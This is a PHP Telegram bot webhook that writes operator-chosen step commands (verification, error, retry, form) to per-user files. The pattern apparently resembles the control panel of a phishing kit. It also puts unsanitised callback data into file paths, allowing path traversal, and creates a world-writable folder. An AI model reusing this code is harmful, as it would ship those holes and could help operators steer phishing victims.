<?php
include("settings.php");

$content = file_get_contents("php://input");
$update = json_decode($content, true);

if (isset($update['callback_query'])) {
    $data = $update['callback_query']['data'];
    $chat_id = $update['callback_query']['message']['chat']['id'];
    $callback_id = $update['callback_query']['id'];

    if (strpos($data, '|') !== false) {
        list($comando, $usuario) = explode('|', $data);

        if (!file_exists("acciones")) {
            mkdir("acciones", 0777, true);
        }

        $archivo = "acciones/$usuario.txt";

        switch ($comando) {
            case "V1": file_put_contents($archivo, "/v1"); break;
            case "V1ERROR": file_put_contents($archivo, "/v1error"); break;
            case "NUM": file_put_contents($archivo, "/n1"); break;
            case "ERR": file_put_contents($archivo, "/retry"); break;
            case "INICIO": file_put_contents($archivo, "/inicio"); break;
            case "ERR1": file_put_contents($archivo, "/err1"); break;
            case "FORM": file_put_contents($archivo, "/form"); break;
            default: file_put_contents($archivo, "/retry"); break;
        }

        file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?" . http_build_query([
            'callback_query_id' => $callback_id,
            'text' => "✅ Acción enviada para $usuario",
            'show_alert' => false
        ]));
    }
}
?>
